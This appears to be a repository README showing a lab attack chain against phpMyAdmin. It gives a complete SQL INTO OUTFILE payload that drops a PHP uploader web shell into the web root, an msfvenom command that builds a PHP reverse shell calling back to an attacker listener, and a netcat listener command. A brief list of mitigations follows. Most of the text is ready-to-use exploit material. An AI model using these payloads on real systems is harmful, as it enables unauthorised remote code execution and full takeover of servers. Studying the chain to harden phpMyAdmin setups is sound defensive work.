## üß† Overview

This repository demonstrates how an attacker can achieve **authenticated Remote Code Execution (RCE)** in a misconfigured **PhpMyAdmin** setup using the SQL query interface.

By abusing the `SELECT ... INTO OUTFILE` functionality, it is possible to write a malicious PHP web shell to the server's web root. That uploader is then used to upload a reverse shell, leading to complete remote access.

This is **not a new CVE** but rather a misconfiguration and privilege abuse chain.

## üìã Attack Flow

1. Login to PhpMyAdmin with valid credentials
2. Use `SELECT INTO OUTFILE` to write a PHP uploader shell
3. Upload a reverse shell via that uploader
4. Trigger the uploaded shell to receive a reverse connection

## ‚öôÔ∏è Lab Environment

- **Target URL**: `http://192.168.110.189:8080/phpmyadmin/`  
- **PhpMyAdmin Version**: 5.x  
- **OS**: Windows with WAMP (Web Root: `C:/wamp/www/`)  
- **Credentials**: Valid user login  
- **Listener IP**: `192.168.45.206`  
- **Port**: `4444`

## üí£ Exploit Commands

### 1. SQL Payload to Drop PHP Uploader

```sql
SELECT "<?php echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">'; 
echo '<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>'; 
if( $_POST['_upl'] == \"Upload\" ) { 
  if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { 
    echo '<b>Upload Done.</b>'; 
  } else { 
    echo '<b>Upload Failed.</b>'; 
  } 
} ?>" 
INTO OUTFILE 'C:/wamp/www/uploader.php'
```

### 2. Generate Reverse Shell Using msfvenom

```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o rev_shell.php
```

### 3. Start Listener

```bash
nc -nlvp 4444
```

## üîê Mitigation

- Restrict or disable the `FILE` privilege in MySQL for all web users.
- Set the `secure_file_priv` variable in MySQL to restrict file write paths.
- Prevent public access to PhpMyAdmin.
- Apply proper file system permissions to prevent MySQL from writing to web directories.
- Use a Web Application Firewall (WAF) and monitor logs for suspicious queries.
